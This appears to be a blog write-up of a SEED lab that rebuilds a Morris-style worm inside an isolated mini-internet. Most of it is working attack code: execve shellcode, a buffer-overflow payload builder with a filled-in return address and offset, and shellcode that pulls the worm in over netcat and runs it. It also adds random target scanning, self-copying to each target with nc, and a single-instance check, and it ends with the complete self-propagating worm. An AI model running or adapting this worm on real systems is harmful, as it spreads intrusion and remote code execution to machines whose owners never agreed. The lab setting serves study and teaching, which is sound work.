---
layout: post
title: "Worm Attack: Morris Worm"
excerpt:
categories: [bof, worm, malware]
---

A computer worm is a type of malware, that is designed to self-replicate across computer networks without needing any human interaction. It is can propagate rapidly, causing widespread damage. One of such case is that of the morris worm.

The worm was created in 1988 by Robert Tappan Morris. He claimed that the worm was not intended to cause harm, but rather to gauge the size of the internet. The worm ended up causing widespread damage and disruption as it quickly got out of control due to its ability to replicate and spread rapidly. The worm started to congest network traffic as it continued to replicate, leading to system crashes and slowdowns.

While the morris worm is old, the techniques used by most worms today are still the same and involve two main parts: attack and self-duplication.

In this post, I aim to document my findings and observations while performing a SEED lab.

<details>
<summary>Lab Notes</summary>

Address randomization is disabled.
```bash
sudo /sbin/sysctl -w kernel.randomize_va_space=0
```
</details>

<br>

### Attacking the First Target

This task focuses on the attacking part of the morris worm. Paet of the vulnerabilities exploited by the morris worm was a buffer-overflow vulnerability. The lab includes vulnerable servers that have a buffer-overflow vulnerability. The goal of this task is to exploit this vulnerability, so we can run our malicious code on the server.

The author of the lab has provided a skeleton code that will be edited and used to carry out the attack.

<details>
<summary>Morris Worm Attack Lab Skeleton Code</summary>

```python
#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo '(^_^) Shellcode is running (^_^)';                   "
   "                                                            "
   "                                                           *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0  # Need to change
   offset = 0  # Need to change

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)


# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
   return '10.151.0.71'


############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# Create the badfile 
createBadfile()

# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    # Give the shellcode some time to run on the target host
    time.sleep(1)


    # Sleep for 10 seconds before attacking another host
    time.sleep(10) 

    # Remove this line if you want to continue attacking others
    exit(0)
```
</details>


#### Creating the badfile

The attack involves overflowing a buffer in a function in the vulnerable program. To successfully execute a buffer-overflow attack, parameters like the stack frame pointer address, the buffer address of the vulnerable function need to be known. This can be obtained by debugging the program. However, because this lab is not necessarily about buffer-overflow, but observing a worm in acion, the author has designed the lab in such a way that these values are made available to the student when running the program runs normally.

```bash
echo hello | nc -w2 10.153.0.72 9090
```

**image**

We will use the information gotten from output of the program to edit the skeleton code such that a buffer-overflow attack happens

```python
# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0xffffd5f8 + 12
   offset = 112 + 4

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)
```

<details>
<summary>Brief Code Explanation</summary>

The return address is after the frame pointer. This means that the return address is ebp+4 (for 32-bit). To find the offset, we have to find the distance of the return address from the start of the buffer. This is calculated as `ebp-buffer+4`

We have chosen the address to store in our return address as ebp+12 because we need the return address value to be an address of one of the NOPs.
</details>

To test the attack, we simply run the attack program. If the attack is successful, a smiley face will be printed out on the target machine. As seen from the screenshot below, the attack is successful.

**image**


<br>

### Self Duplication

The distinct property of a worm is that it self replicates by copying itself from one machine to amother. There are two typical strategies used by worms for replication:
- All the code is contained inside the shellcode payload
- The attack code is divided into two:
  -  an initial payload that is the shellcode used to exploit the buffer-overflow vulnerability
  -  a more complex payload (written using any language) that the shellcode fetches.

For our worm to achieve self duplication, we would further modify the skeleton code as thus:

```python
shellcode= (
   ... # existing code fragment
   " echo '(^_^) Shellcode is running (^_^)';                   "
   " nc -lnv 8000 > worm.py;                                    "
   "                                                           *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')
```

```python
# Launch the attack on other servers
while True:
    ... # existing code fragment

    # Make a copy of the worm on the target host
    subprocess.run([f"cat worm.py | nc -w3 {targetIP} 8000"], shell=True)

    # Sleep for 10 seconds before attacking another host
    time.sleep(10) 

    # Remove this line if you want to continue attacking others
    exit(0)
```

Now, when the buffer-overflow vulnerability is exploited, our worm should be successfully copied. We can confirm by navigating to directory we provided.

**image**

**image**

<br>

### Propagation

After the previous task, the worm has crawled (copied) itself crawl from our computer to the first target. We however, want the worm to keep crawling to other computers. 

This task involves randomly generating an IP address and checking if the host is alive before launching the attack. The IP address will be randomly generated with the following pattern: `10.X.0.Y`, where X ranges from 151 to 155, and Y ranges from 70 to 80.

For our worm to achieve self duplication, we would further modify the skeleton code as thus:

```python
shellcode= (
   ... # existing code fragment
   " echo '(^_^) Shellcode is running (^_^)';                   "
   " nc -lnv 8000 > worm.py && python3 worm.py;                 "
   "                                                           *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')
```

```python
# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
   while True:
      X = randint(151, 155)
      Y = randint(70, 80)
      ipaddr = f"10.{X}.0.{Y}"
      try:
         subprocess.check_output(f"ping -q -c1 -W1 {ipaddr}", shell=True)
         print(f"***{ipaddr} is alive, launch the attack", flush=True)
         return ipaddr
      except subprocess.CalledProcessError:
         print(f"{ipaddr} is not alive", flush=True)
```

```python
# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    ... # existing code fragment

    # Remove this line if you want to continue attacking others
    #exit(0)
```

Now, when the buffer-overflow vulnerability is exploited, not only is our worm copied, it also propagates. We can confirm by viewing internet map provided in the lab.

**image**

**image**

<br>

### Preventing Self Infection

To prevent our worm from running uncontrolled, we would need to put a check so that once a computer is compromised and an instance of the worm is already running, another instance of the worm will not run in a separate process. 
This task involves implementing a sort of checking mechanism to the worm code to ensure that only one instance of the worm can run on a compromised computer. 

In order to implement a checking mechanism for our worm, we would further modify the skeleton code as thus:

```python
# Function to check to make sure this istance is a fresh instance
def checkInstance():
      wormProcess = subprocess.check_output(["ps -ef | grep '0 python3 worm.py'"], shell=True).decode()
      wormProcess = wormProcess.rstrip().split('\n')
      if len(wormProcess) > 3:
         print("There is already a running instance. Exiting.", flush=True)
         #print(wormProcess.rstrip().split('\n'), flush=True)
         exit(0)

# Check if istance is already running
checkInstance()
```

I have chosen to use `ps` to check if the program is already running. I have also decided to check if the result gotten by `ps` is greater than three because:
- running the python subprocess function = 1 positive result
- running `grep` = 1 positive result
- the worm.py program itself = 1 positive result

Thus if the results are more, kill the process because it is a new one.

We can confirm the code works by viewing internet map provided in the lab.

**image**

<br>

###  Releasing the Worm on the Mini Internet

<details>
<summary>Complete Worm Code</summary>

```python
#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo '(^_^) Shellcode is running (^_^)';                   "
   " nc -lnv 8000 > worm.py && python3 worm.py;                 "
   "                                                           *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0xffffd5f8 + 12  # Need to change
   offset = 112 + 4  # Need to change

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)


# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
   while True:
      X = randint(151, 155)
      Y = randint(70, 80)
      ipaddr = f"10.{X}.0.{Y}"
      try:
         subprocess.check_output(f"ping -q -c1 -W1 {ipaddr}", shell=True)
         print(f"***{ipaddr} is alive, launch the attack", flush=True)
         return ipaddr
      except subprocess.CalledProcessError:
         print(f"{ipaddr} is not alive", flush=True)
      
###############################################################
# Check to make sure this istance is a fresh instance
def checkInstance():
      wormProcess = subprocess.check_output(["ps -ef | grep '0 python3 worm.py'"], shell=True).decode()
      wormProcess = wormProcess.rstrip().split('\n')
      if len(wormProcess) > 3:
         print("There is already a running instance. Exiting.", flush=True)
         #print(wormProcess.rstrip().split('\n'), flush=True)
         exit(0)

############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# Create the badfile 
createBadfile()

# Check of istance is already running
checkInstance()

# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    # Give the shellcode some time to run on the target host
    time.sleep(1)

    # Make a copy of the worm on the target host
    subprocess.run([f"cat worm.py | nc -w3 {targetIP} 8000"], shell=True)

    # Sleep for 10 seconds before attacking another host
    time.sleep(10)

    # Remove this line if you want to continue attacking others
    #exit(0)
```
</details>

